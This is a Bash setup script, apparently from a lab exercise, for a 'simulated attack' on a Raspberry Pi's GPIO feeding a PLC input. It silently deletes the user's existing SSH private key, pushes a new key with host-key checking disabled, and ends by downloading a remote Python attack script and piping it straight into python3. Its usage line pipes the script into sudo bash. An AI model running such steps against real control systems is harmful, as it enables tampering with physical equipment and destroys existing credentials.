#!/bin/bash

# This script is the pre-configuration before performing the simulated attack to modify the Raspberry Pi GPIO

# Script execution example:
# curl -sL https://raw.githubusercontent.com/L1LBRO/Modificar-GPIO-Raspberry-Pi/refs/heads/main/Configuracion_previa_ssh.sh | sudo bash -s

# Define color constants
cColorAzul='\033[0;34m'
cColorAzulClaro='\033[1;34m'
cColorVerde='\033[1;32m'
cColorRojo='\033[1;31m'
cFinColor='\033[0m'

echo ""
echo -e "${cColorAzulClaro} Starting the Raspberry Pi GPIO modification script...${cFinColor}"
echo ""

# Verify number of parameters
if [ $# -ne 5 ]; then
    echo "" 
    echo "Usage: $0 <IP> <Passphrase> <User> <PLC Input %IX0.x> <RaspberryPass>"
    echo ""
    exit 1
fi

# Parameters
vIpRaspberry=$1
vPassp=$2
vUser=$3
vGpio=$4
vRaspPass=$5 

# Generate ssh keys
echo ""
echo "Generating SSH keys to connect to the Raspberry Pi..."
echo ""

# Key file path
vKey_Name="${HOME}/.ssh/id_rsa"

# Remove if the key already exists
if [ -f "$vKey_Name" ]; then
    rm -f "$vKey_Name"
fi

# Generate the ssh key
ssh-keygen -t rsa -b 4096 -f "$vKey_Name" -C "$vUser@$vIpRaspberry" -N "$vPassp"

if [ $? -eq 0 ]; then
    echo ""
    echo "SSH key generated successfully at $vKey_Name."
    echo ""
else
    echo ""
    echo "There was an error generating the SSH key."
    echo ""
    exit 1
fi

echo ""
echo "Sending the SSH keys to the target machine..."
echo ""

# Install sshpass if not installed
echo "Installing sshpass..."
sudo apt install sshpass -y

# Ensure public key permissions are correct
chmod 644 "${HOME}/.ssh/id_rsa.pub"

# Use sshpass to copy the SSH key with the provided password
echo "Sending the SSH public key with ssh-copy-id..."
sshpass -p "$vRaspPass" ssh-copy-id -o StrictHostKeyChecking=no -i "${HOME}/.ssh/id_rsa.pub" "$vUser@$vIpRaspberry"

if [ $? -eq 0 ]; then
    echo ""
    echo "Keys sent successfully."
    echo ""
else
    echo ""
    echo "There was an error sending the SSH key. Check SSH logs on the Raspberry Pi."
    echo ""
    exit 1
fi

echo ""
echo "Installing required packages..."
echo ""

# Package required for SSH connection via python
cd ~
git clone https://github.com/WiringPi/WiringPi.git
cd WiringPi
./build

if [ $? -eq 0 ]; then
    echo ""
    echo "WiringPi package installed successfully."
    echo ""
else
    echo ""
    echo "There was an error installing the WiringPi package."
    echo ""
    exit 1
fi

echo ""
echo "GPIO version"
echo ""
gpio -v

echo ""
echo "Installing Paramiko..."
echo ""

# Install Paramiko
sudo apt install python3-paramiko -y

if [ $? -eq 0 ]; then
    echo ""
    echo "Paramiko package installed successfully."
    echo ""
else
    echo ""
    echo "There was an error installing the Paramiko package."
    echo ""
    exit 1
fi

# Call the Python script to modify the GPIO
echo "Running Python script to modify GPIO..."
curl -sL https://raw.githubusercontent.com/L1LBRO/Modify-GPIO-Raspberry-Pi/refs/heads/main/Gpio_Mod_exit.py | python3 - "$vIpRaspberry" "$vKey_Name" "$vPassp" "$vUser" "$vGpio"
